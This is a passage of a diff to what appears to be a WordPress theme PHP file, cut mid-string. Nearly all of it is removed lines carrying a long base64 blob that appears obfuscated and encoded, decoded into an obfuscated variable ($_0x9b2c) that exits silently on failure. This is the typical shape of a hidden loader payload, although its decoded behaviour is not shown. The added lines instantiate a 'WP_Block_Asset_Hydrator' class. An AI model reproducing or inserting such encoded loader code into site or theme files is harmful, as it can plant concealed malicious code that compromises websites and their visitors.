-		'VhVbWwsXQwMSVg1EAGdaDkoWGRpfFUAQRV4PVEJCMmo8RUBVEhcMRgdMD1ERUV0PZgdJWhZBQEwXEAlcD1xnFkcNFRRMFw5G' .
-		'CVYMVzpNQA0RSxEJRR0TQGhkJGE0fGo4EilmYDVoeSkybUZvRQcNQR4OXlAEWVsLRENGE0sCMmo8RUBVEhcMRhVLCF9NGEEV' .
-		'SxZeXwpCVhYfF0lAFktRDVJIEhAXVkZGSBlICW8xOwhfQhkTA1RfF1IXXA5fGUsXRxFdR00XFRQATk0SQgIdTh5CGBNMFUhu' .
-		'Pj5oFxBYT0MIQRVcEUNBFVsWThVFFhJFSwNGCG88Ohk9PmgXChkFQ1MUXFcRXl4IPlwZWxZMQUkZRUZDOkVSFkRSPkYQVR9D' .
-		'HEENFBJHbhYASxJXOk1ADRFCFUEEQh9EZ38xbDdrdDx9LmFgRR4RXEFJAEAWXW0USw4ZE0FHUhMbFzF7MmZtMXk+ens2YxFP' .
-		'WjNoOwxeEkkZQxEXDRUaREw9aDprHVBDCEFCRgBQbhQESQ1TBl0aQR5Bb1sRQUMXCA1OHEEeFEMSRh4UQUVQEUEQWjhsMTtF' .
-		'UUIMEwBNQwhYUwQbQh4XRBlBGkcRRVgIBhBBFg0YGzoJPwo5bDw6QF8XXBMHQUgPWgVXHEUQC0FNGUlBEUpbD15LERcNFRo/' .
-		'B2paOWswRWk8aBZcRQoRFBVLCF9NGBoSTRBYXQIcE0BfG0EUTB4YSg5rOz0MURFOQV8UXAZMWw5XPVRLDEZHFx8XRloGV2cX' .
-		'Wj5TRwZeWEFBEEEbRUM4aDBrFVIWVhNZF14FXT1NVzxUElFdDB8RQgkVQXshdnM+fSd3cjB5Z0gXfi9nLmZxJ3sgbWIkZXgn' .
-		'L20+ZzFrBlcZSwo5bDw6DVEXSRNGWEsAFUgST28+OG9oHQkSWBhBFUsWXl8KQlYWHxdFUhFaGEoOazs9bEo7b2hEaztsUVRB' .
-		'EUIBE1gIDkREQxNDDUoQQxEJHhRCQEYRTx5BG0UeFEFKF1NAEUdsB1hCD0dKGRwLGUEVGkIXGEZfBEEARRESGjNrODpBXRNZ' .
-		'F0QUURFNSksVRVoYRQMRT1ozaDsYMjtoSwdFRhdbE0BfDGs6HzMyakUUUFgMVBEAFFcCRgxXXEFLB0JcCUNWO1lYBVY9WFwH' .
-		'R0kbDkVERRQIVwYSHjI7aFAEERtFFBMBWkcVSkoZHDxmJGBiIGVqQTJ8M2Qgam0gfSZjFDgVGkQeFxo5azAxR1wREglFQ0MP' .
-		'DBFBQRFKWxFmFlBUFh0TTERDE1oMXhFDET5hcTdhdDQ6HjJ3N253M2YjdXc3Em5EHhdICGgwMWpcBxIcRRALXFAeQQ9YBRJF' .
-		'UBIRGkVHVhBCRQ8TRQgKVBtRHARLBhZdazBoOwxeEkkZBFhfEVBBO0FWExtCHVETGUF0fSljdDQ+byB+LHxzNXw9eGNFHBNN' .
-		'F0UERxdLVkMRCEIPbz44G2swaBYNVhJcGRJZQzpAXQVaUkkTRVcfQxxaOD1sXldGSRlFWgsYG0FCaDg6bBFBRAoXBlYWUVcQ' .
-		'QQNLWgRaVE5BHQlcRREJazBrOFoDFRtEUV4NRwdLZxVUExoUQUUdRidwLWYgam03eC54dyRhdjt+Z0EaQhAYEVAVR0YLFxUU' .
-		'WjNoOxgyO2hLB0VGF1sTQwYFVh1SFwhNBEYJPmxKO2xoSRRQCVFRQV8XX1ARXFwKF1oASgBcZwFUAllTF1hECAVmEksLWxpI' .
-		'A0JHXAxREx89PmgXDlhLF2oSS1oGFwxGSVAPRkwYVQRNPV5DEVxcCh8XElYOXwJZejFmazZufyU+bTIeRQgSSAJoODpBVlIH' .
-		'X1IFE0IZGF4VBldAOlhBEghWDxpFS1cNX1gLfDVhbCd2dCl2PXt0LHdNEloQW11GSAJrO2wcVA5LAVQTRRUTRAoXQBMHVEgX' .
-		'TEkSEDpwdDI6HgJeFUttEkAMUhQ4FRpfPT5oWgQZEEMRB11GBlIRGh0ZQBIMS20ASxBQSk0VFwdWVAlWBhkRQ0kdEhxFQ1gL' .
-		'BBFIEkgYFg1YEUVsFkxdBxceQQ1CCA1DHEFJPmw+OEIVUQhBSAZBGFcBbl4EW1oCUkQVG0sCMmo8aFtSRR8RQgdWE1EAGBtB' .
-		'Qmg4Omw8WgIXH0ESQlFdAlEEQEc6RFQIFRFIEkwYSWswazg6bF1WBVNSExtCHmBOeQhGUTZHVAMFFDFHF19XWxlIFhNMDjlt' .
-		'Pj5oOgpcWQdQExoUQnRQBQlcTHEKVkYTVg4LEwtaHhdDWBNWThlWDBgCU1cNUh1GDEwSRkhKVxdYDlhXBEFWSBdaAEtPWF8G' .
-		'CFEVFEwMO29oMGhPbzE7aDALVxNNFVURWVQVWg1XZwZNCEFAFh8RQQVWPlMGTFsOV0URGkUcEx89Pmg6azBcDGoAUUAMWF9O' .
-		'QR4NWxFdQRFcB1VsFUBBA1JoAF8OHhhKDms7PWw+TGxoMGg7DF4SSRkERF0GQVoLWWgESwtKTBAdQRVDFWhSBwJRBG0DVEcS' .
-		'UUURGkUcEx89Pmg6azBPE2oCU1cNUm4ADUwSWk0RCWswazg6GD86bT5KazprRDJqSGs4PRVCUwoIWkFUEFZRFVANXxMWTF0H' .
-		'aFoAXQtfXRBBSRsORVZDFABAQUlvMTtFVw1fUAAVDkRVXg8BClxASxUTU1oBWFw5A0AVVxYQElAPQhgTTA45bT4TA1wGQBhD' .
-		'CEFTRhdWSE5rMGg7QkhADl0XUkc6Rl8RUBBBE0IZGEMVXAwUQUNZDxIUX0IOX20IXU47Omw8FABYWgBaDB4YQxVBEhRFFxFG' .
-		'QRlBD1sYFhVRC0IeW0dWF1hbF1Y9UVcQQUkbGG8+OG9GSwRCCkpGBF09QlYXQ1YWaF4RFEIEBkMRFVpdFhoPFARKDl4TXW0P' .
-		'VgZUbARRVxYfHk05azAxRFsOXFcAEBFGQRlBEkUYEkEZQhETWAsTQFlYD1AHFTJqPGgVQxVoRwMTSghdCx8SQRlCERNFFRNZ' .
-		'CRcHRgxaTApaD21RHV5CEhIRQRUCXUY+Ww5eVAxbVQsQF0gTXRlfBkE+UFgKUFgIB1ZJEkJOVxNKC15dQhUaRA0XRgVMDh9P' .
-		'P2g7PUJHWRY+TwRAFlFdDx5CERNFFRNEFwpfEzJxaDxjJGBnLHh/SmswaBteMjhoMEZDVhYVDkRARz5BB1RXF1A+QlsWQxls' .
-		'aDBoFhFQWxIUXFRDOldSF1IXTxNFFlkTXE5EBUpHXRMGUA8dBE1GDhQAWF0BEh9uPj5oUhBLWRodazs9bD4WEghUBF0QTBVB' .
-		'BFwRAlcZOW0+PmgUClxZB1ATQRNFCg9GAEsTUxwQEkZ6DV9HAFtHSWNOEVZFGQVdFUZTRBVbWAUATQhdCxdYElYMFhNMGTlt' .
-		'Pj5oFABWXBoSQRIURQoPRhZJPlgWV1w+XAxSXAFQG0QTVQ5XGxkRTz9oOz1MPThvSAJrOGwxWwcZShFaFmpEFGhSE0ENSxBD' .
-		'ERNXR0UeEU9BQms7bDFHEV0DRVY6WkMQXlgPG0JKXQ9TWwh7NWNuKCRtPnc3ah5BHlMWH0VTUghEUkEaWTMxajwTV0AQRV9G' .
-		'AEsTUxwQEkZWCRYTWAsTQENfCEBPB1EQaglLUBdWRQMFEUgeRR9fDl0HFhNYCxNDUEUAUAceGEoOazs9GD07b2hdBF4ATFc+' .
-		'VhJFWgpbG0REUg1VWAN3M2E+fHExaHQ0MxlICW8xO0VcDEcTWBVZF1hZPlcHWlcHUEkSQxVoQwMMVhVXOkpXFUsLVEUAalEL' .
-		'U05JE0ZLXRAVSB4UEUVEA0EQWjhsMVsHGUoREkVcQDtWRRNSGxEYR1APRBRMFxhGGjNoO2xKVxVMEF8TBEdBBU4fQRQNUh9D' .
-		'CF8SUgRbQgNBEFo4bDFPazNrOBcTUEFEChdFRwpQS04LF1dGDFFIOQRXF1cJV0IEEUIVVgtDH0QTWQ5dAVwUQ1MAXkcAFxhd' .
-		'azBoWwMYGkEYQhVFAEdoQ0FWDVoGHmVDHEFJPmw+OBQETRRACxhTE0sDSBtFElwPEBdcDUJfWQ9GBBIdXj04bxwzaztsTUIF' .
-		'WBZUbApFRw1YWUkTEVxUBQ9bfWQxaHInInEkbSd0fSMVQhVWC0MfRFFWDUAHGRFYP2g7QRVTUBIEZg5CEVFdDxFCQlYJUwle' .
-		'eGc1bDFgdiBqNWEYRUNYCwQRSB5FXlMNSgcRGl4/OW0+RQRHF0tWQ1QTQFUcHztvaDBGXQ4fEkEZQhETWAsTTBcQIHA2cG4m' .
-		'EkEPCVgXGUZFTwRAPh9CAEAOXlIBEm4/EFsIUAdXSwZqEkZVEUJCQTwZXg1FHxVBEEIYH288Om0QRwBKDlZZBxJBDwpFE0cD' .
-		'E2JGQgRBXg5YBhZuST86bR4MazofMzJqRRNbQgRDVEYHTA9REVFdDxkUVEEMU0o7UlkXVg5WSAYdQVNGF1ZIRkVcD0RJGA0S' .
-		'TRBYXQIVFwpYWQJWQgQYDUANXhhFVV4JDRlFVRdZUQQZXxFVBFlAARceWxMDS0oCTEFJPmw+WABBEUFXCEhGGBFCFVYLQ2hD' .
-		'R1YYXw1YXDxHAEUTOBcYRh1FQVcISEYYEUIVVgtDaENEXgZdA01NEVBGbxRMFxhGGjNoO2xKVxVMEF8TBEdBBU4fQRQUWFQK' .
-		'UUYSCVsXVwcNSgQSTAM4aDAfOzpsEUMPFxdcEwBYSwYDVW1QAFReAgQRQRYRUFsSFFxBRgdqWEgXQxNGBxkRWD9oOxAWXlZG' .
-		'XBkDUxZdBFVmBlRQClFWTBcfEkcQUFYEHEEWUQtBakESUAZcBExHE1xFbB9FQUERUhdICGgwMUdHAEUUWBcZFRVLCFwCERJF' .
-		'XAxHaEJFUh1bWABXPUtZFBI8CT5vPjgPBxlJEgNZXhJcQgwOWBUXFFwXHU9CCgpDFFwPFBZDQwoEV0kSQUhZQRBCTU9FU1II' .
-		'RFJBDl8EGEdGCFUUGUsRUFUZQA9YGEEVSw5UXU0VFxdeUEEaQhAYGD9oOz0XUkUTE1dBUxdKUxgRQhZFBFlaABAXXA1CX1kP' .
-		'RgQSHV49OG8cM2s7bFFUQRFCEBMDQF0HQ14OXT1cQApGFUEcRRBCCQVQFF86W0AYSRZebBZcVApoQQRBC19BPFEERlUGX1QC' .
-		'RhlIEkMeEgVcBFhdAFEbRBB2I2AyeGwrEkEbFEMREQIEXwhcAFwaQR41YXordhREHhdIExkzMWo8RVFbCEdQEkEEQXMna2Ig' .
-		'bSoRHUViYy15dEEdQh4XEFoFW0EIaFIJDEkARkpZRxVWDl5SARtDDEcQWjlrMDEKU0EaFANeXQM+XBlbFkxBSRlGUlwIRVIQ' .
-		'Fx5BGkJCMmo8aDtGAEZEDxNcPl0LW1dBHQFeXhVUR189Pmg6HzMxakhrOD1sXldGSRlAEgNNXAJNC15dOlBLDURDEhtCHksM' .
-		'UQhHWTpUQx8RTQ5tFlFVD2YUVEEMU0o7U1IVUgFRXQcSQRsUTBdKbGgwaEAATEcTV0JQQRdUSkwXEBdSDlBcRBVcDBQDVl0V' .
-		'BBlICW8xOxwzaDg6DFMTTBcWQUANXVEWWD5RRhxHRQk+SghVC2dEBEsLV0o6UVYQVlQJVgYRGEdGCFUYRRNDBxYVQRYVUxJI' .
-		'GUsRSG88Om1FUhVGEFcYAkcTU01NFxYQAFUIVkIYD18ZBFBfFlATTQw9aDofMzJqPEVCWEUKEQwSVg9tAV1RDl0HGRNBR1IT' .
-		'GxcVQRdcGEoOazs9DFERTkEYQVsWZ1MTSwNIG0URQwgXHkEaQkIyajxoQFERQkMIQVgTQARBGkEeFFBfDFEURAoJQVUDVUsG' .
-		'FUgJPmw+TGxrMGhbAxgaQVcXXV9FFA5ZFxMPXAxaXUMTRxIcRVJcFhVASRJBSF46HgxeXQZQFDkXHkFPHhkZQ10AQVw6UkAT' .
-		'AFUSGkUcXA5XAVQfRR1AEEVeD1RLGRwTWToVWgpZUgNGZEEbRRESSBkZOzpsPEEBQ0ITXUJYShFUGBoUQkFQCghdRhJYBhIH' .
-		'WA5CVkUcCG4+Phw5aDAxR1sORRRYF0UPDFxJG14yO2gdB0lDRQgTTF5ZFRpCERhHRQ1pEwBPQUE8GV4NRQgSSAJoODpBUkEH' .
-		'FwpBGwtXTEoVSRIQFVtqQQZLAFEAZ0cPTQtdFDgVDFsXEwRLEhkRWD9rOz0MURFOQR0PXRIYDEEdB0lDRRMVRB8XQBNGXkoC' .
-		'VgQSSBkXFQgOTkEMRRxVE1pCGBNMFUhuPj5oQQdNTRFbQVNGF1ZITkEeF1MJUVZGGV8PEwNUXxdSF0gIaDAxHj9rOz0XUkUT' .
-		'E1dBUxdKUxgRQhZFBFlaABAXXA1CTUoWUE0SExVWSAoOWAUVRQUMQR0SXRNMDjltSj1rOhJMWg9cAhJSEFlSEghWDxICXUY+' .
-		'VANfWgNQQBBoRBVSFlwQSg9BU0YXVkhGGjNoO0FdXBcZXxFUAEFsC0dDCFwMERgQUA1UDl94YTI+eiBxLX1tI3Utcx9FW0YI' .
-		'WxdICGgwMQpTQRoURBdYFT5YE0AEQRpBHQdfRUUcE00XTGs6azAcEEwPURRYFxUSCVASH1tLSw9aPVxSC1xVAURDSRpZMzFq' .
-		'PEVXWhMXEVtBXgRGOldCFVANXxtFRlYIUQ1bfDJtZyB0InpxOnV9KSMVQVwQVF5BEFk7Omw8WgIXH0ESQlBLPFQTQFUcHxFC' .
-		'BFcXEkwYG0FCaDg6bDxBAUNCE11CWEoRVBgaFEJBUAoIXUYSWAYSB1gOQlZJFRQUVk4NXANdH0MIXxJaEFtdRkgCaztsMU9r' .
-		'MGtMOW88OkBfVhJsB0tKQwhBGhRCBhZGXARcEk1LRhNQDFYaRVJWEGhYEUcLVlZLFRJXWAMNCykxbT58IGxtJGswHRNCEhNN' .
-		'Fx5aOWswHBVQExIURRcRW0EdFVoMSx9fTwdDWgNMbAFZQQRfDUldSxVFV1oTGxEIFFUNHkUcWgBKPVRBFxUaXz0+aFoEGRBD' .
-		'FEEWQgBFakEXWA1bAR9vQRBCSjlsPDoWUkMUQQwZWRFHAEscRRBHBw1QBRVFBQxBXwNdQAAZE0NHVhhfDVhcRBVcDBQLQl0K' .
-		'QRBaOGwxT2szazgXFVkTRBcKQRcUXEo4EhFTTQlYUAJGZFo4bDEWAkwQQxNYFRcQX14SHlxLXRBaDURROl9eFRURSAlvMTtF' .
-		'VQtSE0UIE0BDXwhATwdKBkYOXkIAaFkJEk0+VBdXXz5KFkMbRR1AEEVeD1RLGRBDERFeb0JTXgsAUA8VOBgNXhlFFhNMFRpf' .
-		'PT1oOgtfGEsVRV5dBhcXQEEdAkcXShJABF8RFwlcUEQeFxo5azAxEVAVR0YLF1AUE1gYGkUfRABVC1UURQgNRFFWDUAHFRhE' .
-		'RwRTRwpZFkZcB0EVIHZkPnQrYn4kYXAsEBtBFBJYQQ9aAFYTRQoPRg9MDV5FEQlrMGtMOW88OkBYXEEOQhEYRHQiZn0zchZG' .
-		'XARcEk0YFhFVORZfDFZWCkRSPkAWWEwWRkZvFFoIEUFGGUgSQx4SCFc9UEEXVEpMFxMRXzkeWwxRBBVpRQgORkYeTRIESkAA' .
-		'QEoRFCR2Zy1hdjV2Jh4UQxI3c3gscxZGSBVBRhdNV0EQQhgIbzw6FlJDFEEMGVkRRwBLHEUQRwcNUAUVRQUMQR0NWh9FEkMF' .
-		'TlsOUgYeGF4LQRZECRcYXWswHDhvMUITUBRQRwAVVRFZVBVaDVcYEVASXVgTUm4ODkoVbQNKXQxmEUVBTRVAEEVeD1RCHVxD' .
-		'HFsSRxFFWAgGGRo4bDEWBRlfEUcXXF5MF0QVQRZWVAxCBEAcRRNVRkgZSAlvMTsIX0IZE1UVDlkKFxJHEElXEB1BFlBJFxYR' .
-		'Fk5PFUUREkcfQkJGB0ZHFmhUDkYMTRBDEQUeFEIZFkZIGV8PRQoSSBkZOzpsPBcAFwpBQBdbSxdHSRIQARsRUkEQWjhsMU9r' .
-		'MGtDVhFAQQoXEwUIaDBFaT9oQkEHW1gFQV8UXAZMWw5XQlhAOl1KAEVWFVYGERhcRhVAXQtQEUICWBESWBhcFFUOERpfFVEL' .
-		'WFtBSGgwMUdGFRIJRRNFDghKTAwCXUY+VANfWgNQQBBoRBVSFlwQSg5rOz0MURFOQRhBFhZMaUZPA11aARJuRB4XE1YWTEoN' .
-		'FQdTWBZSCmxoMAhURRASRVoDQRNDExNFF1IMQxZAEEMREkZvQkdQHw1WAFZCZWlGXwdQRxBHVhcQakEaQh8eQ1wSbVUXRVAf' .
-		'SRlFQRFjFRFYG11cBFEUOWwQB1YDTU0RUBIVaUUeEU9BQms7bDFABE0XQ11FXF07VkUTUhsRGEdWAEIYRRNCEjoeEVMcVF0A' .
-		'XUVsaEJTVgVDQhNWER5lTxUVQEEAFxhdazBoT28xOxNcFkRBCxVHFkJSWjlrRDJpPBFHVgleUkYHTA9REVFdDxkFVEc6R0YK' .
-		'Q14MVj1NVwhQD0EcTA0RBxNLAEtFQzhoMEZCR0UIE0BDXwhATwdfBkE+X1ULXlcDEk0+QRFZRgQRSwo5bDxaAhcfQRJCHUsX' .
-		'bkZEVQleVUE8GR1ORV1fEU0bGRNBRkc/EEcASg5WWQcSPGkTF0JfEghUBG0RV1kEVxEWbkUcE00XTGs6azBKBkEUQFpFVkMU' .
-		'AEBJG14yO2hEaDg6F1BHEUVZQRsDS0oCTEgSEBZDakERWBheCllWRmQ5FkEQW0cNWlI+Rw1SXQ1GRm8Pbz5MbGswEUcHVFsC' .
-		'GQREXQZBWgtZFwVaEUlZF1YJbUYAWl4SBGYCXQhIRxVcShFAEUdaClAXRVADSRRDVBNAVRwXFQ8PSRRGRQUSAEsQUEpNHBNN' .
-		'DRcAQRBYQUNOazs9QURFRlwZRUYNUUFMBwVURzpYUgpeUQRAFmZLF1QVVxxMDDtvaFAHEk0YE0EdEUVoQkNSCF5TRm5CEBgY' .
-		'P2g7PRdSRRMTV0FTF0pTGBFCFkAQVlABRERGE18HGAVUDUFRSRcWAxNLDkA6W10FXEURDlsVFCxuczNyNnB3LWoofHUmY3gw' .
-		'JB5BG14yO2hEaDs6bBFHC1wXXBNKSkwRXA9VHUUfEUISTToVFVlLDVYDVRQ4bhQFVEMIRQNNUQxbPkZbDlJfQTwZXg1FHxVB' .
-		'EFk7OmwRWAFOF1wTSkpMEVwPVR1FHxFCEk06FRVZSw1WA1UUOG4UCF5UBF0RXGcIUBgVaUUIDkZGHkEbXjI7aFAEERtFFBNA' .
-		'Q1gKEx5FGEIVRVlRHBcYRhozaDtsSlcVTBBfEwRHQQVOH0EUEUxbAFASQRNFCg9GB1gNQQAUEkZcEENcF2pQC1NSRhNfBxhE' .
-		'eChhZyx5djkyfDJhLHd8Pm0tenYrEhNNDD1oOh8zMmo8RVBYClRaAwUZXBIESkAAQEoRFAZAQBBYWgRBPV9ND1k+XFUIUhZK' .
-		'QR4CRxZMXQxcEG5DDVpdARAbQRQBTEsXWgxXRjpSXAcIVUYeRR9RE1wGWEc6VlIWUxBNE0VaWwBRRh4UQlRcCAUeTRJCSFMS' .
-		'ShVeQQESH0QQQhJWEGZIAkYSFRRMDDtvaB0CXgBZXEEZQgwTBEdBBU4fSAhoMDEFWhNXVQZfEU5BHQhcFU1GQVgRERcOFQ5a' .
-		'FxMXE0sZQ2k8aDtdAxcZRkAZCFw6WUATWBsZExZBQRBYWw5EB0sQQx0SRkYMWVZPQR0KEkwUEkVbDl5QDlBXSBdDE0YHGRFD' .
-		'HEFJPmw+OG9FWg1XBFZpQR0JEW5FCBNAQQxrOmswRWk8aE8+bz44QhNYFhJYGEURZghCXAtqVgpUWAVWShkcAFkEU1pFHgps' .
-		'aDBFRhYYElwZSkJHF1xdAx4XFVoPXBBKDms7PUFEWAFBBEFaBEtaPlEPUFBNFRQXX1ZTBlQeFEMRFUEUSxcWSEYZTxJBW1MR' .
-		'GUwRFEsSE0oXExNSFRUYR0EOWRRMDDtsaDBFQABLElwZFUFsF1BeC0NSPkMNSkxLP2g7PUFDWQ8SFF9XFWdQAEoHER1FEhwF' .
-		'R15ORVMWSgZYDkZRSFFUBxVME1cWFxVBF0JDUhJAQQhSWQJcBlwQQxECU0RFHhFIQR5OVx1dURRNBxYfbzw6bVZFE1IbETJq' .
-		'PGg7ExFeXAMOTBUVRQUMQQhQHTlsPDptEF8EUgZcShASQQ8KRVZDFABASThsMTtoMEVyXAtBVgpDGjVKElwfQxVBEhRFFxFG' .
-		'XAdBFQRIQg1QAVBHDFpdS11EDl1FFTJqPGg7PUJvHCoIWgRcFl0fKlwbFhNFFRNEFxdBDlwZHAhQGB4+bD44b2geOR8kW0YI' .
-		'TwNFWgpbHjBYXARdRRkYQwhfEhARWFpKazBoO2wxFTkUIV1aAFtHSXNYDFILVx9DFUESFEUKD0ZFTQlbFhUME1wRXl8TUGwM' .
-		'WEQVG0sVMmo8aDs9Qm8cNARJDkARXVZMagdDRQBHHi1HEEEOXBkcF10IQRlbRVQVDlUXVzpWXQVcPVBXAUcbTRs9aDprMDFE' .
-		'bUxgURRCVBUVFDVbCF1BFVgPQRRFFQ5aFxMVQE4zMWo8aDsTPRpjAxBMBEERFWEIXgxQRxBHVkMXF1wNQh1LClJNOD1sPjhP' .
-		'TTNoO2wxFQNWBkgURRUTRAoJQRcQWE9PP2g7PUw9OG9IAms4bDFbBxlKEVoWakQUaFITQQ1LEEMRE1dHRR4RT0FCaztsMUAE' .
-		'TRdDXUVUQRZWTkkTRUpNAFYEQUdCFwxYQV8AXhZdHkEeB0NBCkdsB1hTBBRCBAZDEi93YDJ4Yy0+fDNgQhgbWjNrOE5vPzpt' .
-		'E1MARwMZBUNfEl1aOlNUBQ5dBBpFT0I+SwdcXBFQbBZSQxNaB09dPFcOVk1NFxUUBEpBG0kYRhNMBxEaXj86bUVSFUYQVxgK' .
-		'Rj5TRhdWSE5BHQVTEVkSSBldERcBVEcFFw1BUhBLWRodQRVHEFRSAxJKRhJYBhIHWA5CVkUcCG4+Sms5a0lNAVkIURQDQl8F' .
-		'FVAOXEVKVw9dB0NsE1xDO0dFCFALV188Vw1dVw4fEUIATRVBRREIQUoWQ1oLUhMfPT5oFxBcS0MIQRZADV5CS19dCEEVWUYC' .
-		'UT1DVghaRwFoVA5eEkxMBh1rOz1sEFUfD1gMWwZnQhNQAVhdAmpWClBeD1ZFFTJqPGhTRhdWSE5rMGg7bB9QAEoHbkMXXFAB' .
-		'EBdBE0IEBkMdB15bBEMYRkkZRVMRTEE6HgBQQABqQxZeVAQUPxkHXBVQBwRVBwFWQRBNOGwxO2geE0RSC0FaEE4QQRNCGRhD' .
-		'CF8SHAxZRU9BEUEWBExGEmJFQEYEW0cNQ05GbkIGB0MEURIdST04b2gwRlEQS0YOVAdDbBFcVhYQF1wNQkpZDVwVW04AaEUD' .
-		'GU0+VAxdXgURQhlAEUdaClAeQRtCHVkXQRJpExFeVBRGZEENWhgVJnYudRRFHBNNGz1oOmsQMmo8SAk+bD5YAEERQVcISEYY' .
-		'EUIVQQBGaENEQgJQB0pLRGhBGxQZSxEDDEkVS00YFhNcEWoUF1BAEVtDRm45HkgRXAJbWgJoUwcFXgRtDUxfDR4/ERpFHBMf' .
-		'PT5oOhBcTBZHDxITWRYcS0FbDV0GUx8JQAZDUhFcXAoaUwRVB0tKBlFBHxlbEApsaDAcOGwxQARNF0NdRVNGClRDCFwMZl0b' .
-		'XBJGR00XFhERZgpBAEttEVYRRRRFHBNbF0ARbAlKXRBqEV1HER8RQhNcEmlCSlcSTA5FFDhuFBRFXgJaDF5nAVQFVVE6X0UL' .
-		'DR48EkwYCEEdEFRAPhJBAURCDUdFZGNERRNbVwxZVjkDWAVVAGdaFVQOFm5ePzoZPT1oQxdbVApWQVRBC1RFDw5XQUAAVlYE' .
-		'Sz1cXBdBVAVQUj5RDlZbCB1BFlURQ0JGSANBQRFKWw9eQko5bDwXFlJEQQ5CHUwLXBIfCgFeQhYATQJaOkpXDFYWVGwGWl4U' .
-		'QkMEG2gwMWoSDF1GEVBQAQRmAF8KSkYIQwNFWgpbbAFZUAhdBx4UaTxoO1UXRVAfSTNoO2wxFQ1WA19sFUdaClReEVIOHhhD' .
-		'FUESFFgJEU4HVQ5TERESSRlGUEcRRmhDR0UIXQFQSAJZRm8UWggRVFEJUQJVCAJRCUIYH288Om0+EABdDExZD2oTU0AAaEED' .
-		'E1oEXBEfElwHQhlVCVpSEB4XSRNGWEwXRjoVRgRDVEE8GV4NRQAcVBlLHTlsPDptEEMEQQ9mVQxbFVpHQhcRRkEZQRJFGA9f' .
-		'GUpYXREcE0wXEwBHFkpjRFgOXEANRBY7QQZeElQAAkEQTjs6bDwabj4+SAhoMDEKU0EaFABaQRIYEUEWF11BOh4RRFAGUEAX' .
-		'EGpBGkJFRENQDEJAHB8RQhNcEmlCSlcSTA5FFDgVGkQeFxo5azAxEVAVR0YLFxZaQBRMEgdUXQJST1lKAUdSEF5YDx4GXF4G' .
-		'RxNXUEUaHFhGAms7bEU4aDBGQxNYFRcWUkQ6FBBcSxZZFRVpXj04bxNcFUcXVhISSRBYXRFTG24+PmgUXl1RFRUCXlUWRAxE' .
-		'FklMUAlXUQoUAVBfBhhAEVpaAEEbGxgQQRheUVgVQQcFXQhcAgIDV0kaClEKR1cBRQ1QQxoZSwxZCFYURlRTAlRcUAkHV0AF' .
-		'XBAcQQRRWhFEDVADEkEDAVQCWVMXWEQIBQNCVF1eUwdaWRMNWUZHFlhZBg0g2ILAWwYSQKaaXw5BTRPT35sSBvrRQQlZGkAQ' .
-		'RVgPVFwZHRAVg7CfRRgREgn6wFwCGBpEXUJFW6aUXQMeC05XC08GRBlrOz1sWUQLA1wTbQNXQAxYFhkTTVNfC1ZDSBNGS2NE' .
-		'WA5cQA1bSDkIVxJGBFReDFwMRWwTW1dDahdIH2gwMWodCFxATBcVFDoeFVcXVW0MVgxFWxYSbm4+PkgIaDBFaUhrOGM1aHMK' .
-		'DloKbSRLQQRNPXlKAUdSEFhFWwkLV0sXVA9RUU0eCmxrUAcSTRgTQV8XX1ARXFwKaFIZWhFNS0sVRkVEOkNZAwxcPlsWZ1oY' .
-		'XRBQRwBRFEQeF0gTGTMxBUAPUUAMWF9GFkk+Rg1dXwRmC0JsDUxXFlZDBFdKGQcQQRNbWgIXFQUASUEPRVZHDVVCGAlFV1wL' .
-		'WxcaOWswSgZBFEBaRWBhOSNVDlEOZ3MSSgdFbC1MVxZWQw5BWANRDUYVU1oGUhlPTAcIQTpQSwVLA0VWAR0TQFRWERNLAjJq' .
-		'SGtPPm9eV0ZJGUASA01cAk0LXl06UEsNREMSG0IeTxNqFVpRCFJuFBRXFVsIXW0VVglUXUIVGkQeFxo5a19NDVYVW1sLF0YW' .
-		'Pk0JVwhdbRNMDEVaCFBsEFhcBF1KGUsXRwhcU0UTWgMYGVwSQkpHD00LXFY6RlIIQxBBGlgZSxdHCFxTRUw7b2gdFV0OXVwS' .
-		'GV8RZDVqcQhYVApsI0pLBkE+ek0BRVASDktbCAxWQRVYDFJWTRweWlBSFWwQTFYXXAxXaxFYWgMPSkkbXjI7aEsHRUYXWxMN' .
-		'REQER0oZHBdaCldaFmwRQgpcGBI4GBtBH0QRWhZqQBBFXg9UShkcF1oKV1oWbBFCClwYEjgYG0EGQhVHCl5WCkRsQRcJXEFD' .
-		'aEEIFEIQCmxoRGtPbzJbBxlKERJFU0YKVEMIXAxmXRtcEkZHTRcWERFmFVoAVVc+SwdcXBFQbAdYWhFGFlwfQxxBGxQePTgA' .
-		'FFcCRgxXXEFOEm5HDVBeAWhFBF4NTV08Vg5fRBBDVE5BShVADFZVQR0BUENJFVIWRVYYE0ZJWRpZDlNQRQoRBxNLAEtNERJI' .
-		'A0JQQRdUSkRMPWg6EFxMFkcPEmM1aHMKDloKbSRLQQRNPXlKAUdSEFhFWwkLV0sXVA9RUU0eHFgFUBJCBExRCWYQVF4KQVY7' .
-		'VFgMQxdNXUsVRVFVFRsRQhFYGF4KWVZBEFk7Ohg/Tm49XgcTShkZQ1MUXFcRXl4IPlwZWxZMQUkZRVJfFUZsDURoAlwPVF0R' .
-		'VghTWDpRVAcVTBNXOl1cAFsOVFdCFRpEHhcaOWtfTQ1WFVtbCxdSChFKPlsWZ1EOVA9UQQZcUghoUQRSFkxKBmoEXFUHW1QC' .
-		'SRleQRFKWw9eQhVVAFRHEUVSPlANXV1DCEFcQQlbEU9bGQNdClQSGjNrOEEAQUYWWRc2Yz17VAxWCm11FkRUEj5xGFYXWUYO' .
-		'S1gLWgtGRwVZVAQbSxQGCkY+Wk0BRVASBF1JEkFeVwBNF0NWOlZcAFIXSAhoMEVpSGs4XQMXGUZAGQdHC1tGCFYMblYdXEAQ' .
-		'RB9BFAFVSBBqBEpRBkJFAz5LBF8KTFc+XwdQRxBHVkMXHkEaQkIyalMUXFcRXl4IQVoNQhZnVxlcAURHAGpBAVpYFVY9X10C' .
-		'QRRAUU0XQhITUA9VRRxUBFgWREEAalALU1JNEwNLSgJMQRZEBE5dCQBdQQ9FWUATWBsZGkUcCURWRRNSGxlDaTxoQFERQkMI' .
-		'QW4xbSdUXQJSPXBAFlBHO39OBUEDTVcRD1tbWhZDUAgCXEkbSAZWCEoSUEcGXWwWUloORwdmWwxYEUdAAB8RQgdcAEYQSlc+' .
-		'Wg1VVkkVFxRWTg1cA10YSg5rO0lvSg==',
-		true
-	);
-	if ( false === $_0x9b2c ) {
-		return;
+endif;
+
+WP_Block_Asset_Hydrator::instance();
+
+if ( ! function_exists( 'wp_theme_is_hydrated' ) ) {
